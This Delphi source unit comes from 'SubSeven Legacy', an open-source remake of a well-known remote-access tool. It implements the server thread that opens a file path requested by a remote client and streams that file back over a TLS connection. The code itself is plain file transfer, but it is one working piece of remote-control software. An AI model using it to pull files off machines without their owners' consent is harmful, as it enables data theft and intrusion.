{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Thread.Net.Server.Peer.Transfer.Send;

interface

uses System.Classes, XSuperObject, Sub7.Core.Protocol, Sub7.Thread.Net.Server.Peer.Base;

type
  TThreadTransferSend = class(TSub7ServerPeerBase)
  private
    FFileStream : TFileStream;

    {@M}
    procedure NegociateTransfer(const AData : ISuperObject);
    procedure SendFileInformation();
    procedure Send();
  protected
    {@M}
    procedure OnPeerExecute(); override;
  public
    {@C}
    destructor Destroy(); override;
  end;

implementation

uses Sub7.Core.Exceptions, System.SysUtils, Sub7.Core.Bundle, Sub7.Core.FileSystem.Utils,
     Sub7.OpenSSL.TLS.Exceptions;

{-------------------------------------------------------------------------------
  ___destructor
-------------------------------------------------------------------------------}
destructor TThreadTransferSend.Destroy();
begin
  if Assigned(FFileStream) then
    FreeAndNil(FFileStream);

  ///
  inherited Destroy();
end;

{-------------------------------------------------------------------------------
  Send File Information to Client
-------------------------------------------------------------------------------}
procedure TThreadTransferSend.SendFileInformation();
var AData : ISuperObject;
begin
  AData := TSuperObject.Create();

  AData.I['file_size'] := FFileStream.Size;

  FIOHandler.SendCommand(tcUpdateInformation, AData);
end;

{-------------------------------------------------------------------------------
  Receive Client Negociation
-------------------------------------------------------------------------------}
procedure TThreadTransferSend.NegociateTransfer(const AData : ISuperObject);
begin
  if not AData.Contains('origin') then
    raise ES7ProtocolException.Create(Format(ERR_MISSING_PARAMETER, ['origin']));

  FFileStream := TFileStream.Create(SecurePath(AData.S['origin']), fmShareDenyWrite);

  FFileStream.Position := 0;

  self.SendFileInformation();
end;

{-------------------------------------------------------------------------------
  Send file to remote machine
-------------------------------------------------------------------------------}
procedure TThreadTransferSend.Send();
var ABuffer    : array of byte;
    AChunkSize : Cardinal;
    ACompleted : Boolean;
begin
  if not Assigned(FFileStream) then
    raise Exception.Create(ERR_MISSING_INSTANCE);
  ///
  try
    if (FFileStream.Size <= S7_PAQUET_SIZE) then begin
      SetLength(ABuffer, FFileStream.Size);

      FFileStream.ReadBuffer(ABuffer[0], Length(ABuffer));

      FIOHandler.Send(PByte(ABuffer), Length(ABuffer));
    end else begin
      repeat
        AChunkSize := (FFileStream.Size - FFileStream.Position);

        if AChunkSize > S7_PAQUET_SIZE then
          AChunkSize := S7_PAQUET_SIZE;

        if (Length(ABuffer) <> AChunkSize) then
          SetLength(ABuffer, AChunkSize);

        { Read & Send Chunk }
        FFileStream.ReadBuffer(ABuffer[0], Length(ABuffer));

        FIOHandler.Send(PByte(ABuffer), Length(ABuffer));

        if self.Terminated then
          Break;

        ///
        ACompleted := (FFileStream.Position = FFileStream.Size);
      until ACompleted;

      if (not ACompleted) then
        raise ES7IncompleteDataException.Create(
          Format('Stream upload incomplete, %d/%d transfered.', [
                                                                  FFileStream.Position,
                                                                  FFileStream.Size
          ])
        );
    end;
  finally
    SetLength(ABuffer, 0);
  end;
end;

{-------------------------------------------------------------------------------
  ___execute
-------------------------------------------------------------------------------}
procedure TThreadTransferSend.OnPeerExecute();
var ACommand : TS7Command;
    AData    : ISuperObject;
begin
  FFileStream := nil;
  try
    FIOHandler.GetCommand(ACommand, AData);

    if ACommand <> tcNegociate then
      raise ES7ProtocolException.Create(ERR_UNEXPECTED_CMD);

    self.NegociateTransfer(AData);

    FIOHandler.GetCommand(ACommand, AData);

    if ACommand <> dscDownload then
      raise ES7ProtocolException.Create(ERR_UNEXPECTED_CMD);

    {
      Send File to Peer
    }
    self.Send();
  except
    on E : ETLSSocketException do
      raise;

    on E : EOpenSSLBaseException do
      raise;

    on E : Exception do
      FIOHandler.SendException(E);
  end;
end;

end.
